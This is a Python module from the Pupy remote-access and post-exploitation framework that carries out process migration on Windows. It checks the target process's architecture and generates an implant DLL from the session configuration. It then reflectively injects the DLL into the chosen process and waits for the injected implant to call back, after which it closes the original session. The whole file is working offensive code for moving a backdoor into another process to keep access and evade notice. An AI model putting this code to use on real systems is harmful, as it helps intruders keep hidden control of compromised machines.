import pupygen
import time

def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
            if int(c.desc["pid"])==pid:
                return c
    return None

def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False):
    '''
    - bindPort: The port used for listening on the target WHEN the current launcher uses a BIND connection.
                When the current launcher uses a BIND connection, this session is kept even if keep==False
                When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy), bindPort is not used in this function
    '''
    module.client.load_package('pupwinutils.processes')
    isProcess64bits = False
    # If current launcher uses a BIND connection, isBindConnection == True
    isBindConnection = False

    module.success("looking for process %s architecture ..."%pid)
    arch = None

    is_process_64 = module.client.remote('pupwinutils.processes', 'is_process_64')

    if is_process_64(pid):
        isProcess64bits = True
        arch = 'x64'
        module.success("process is 64 bits")
    else:
        arch ='x86'
        module.success("process is 32 bits")

    conf = module.client.get_conf()

    #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
    if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
        keep = True
        module.warning('Enable keep (forced)')

    if module.client.desc['launcher'] == "bind":
        isBindConnection = True
        module.success("the current launcher uses a bind connection")
        module.success("the bind port {0} is defined in DLL configuration".format(bindPort))
        conf['launcher_args'][conf['launcher_args'].index("--port")+1] = str(bindPort)

    dllbuff, filename, _ = pupygen.generate_binary_from_template(
        module.log,
        conf, 'windows',
        arch=arch, shared=True, debug=debug
    )
    module.success("Template: {}".format(filename))

    module.success("injecting DLL in target process %s ..."%pid)

    reflective_inject_dll = module.client.remote(
        'pupy', 'reflective_inject_dll', False)
    reflective_inject_dll(
        int(pid), str(dllbuff), bool(isProcess64bits)
    )

    module.success("DLL injected !")

    if keep or isBindConnection:
        return

    module.success("waiting for a connection from the DLL ...")
    time_end = time.time() + timeout
    c = False
    while True:
        c = has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.pupsrv.move_id(c, module.client)
            module.client.conn.exit()
            module.success("migration completed")
            break

        elif time.time() > time_end:
            module.error("migration timed out !")
            break

        time.sleep(0.5)
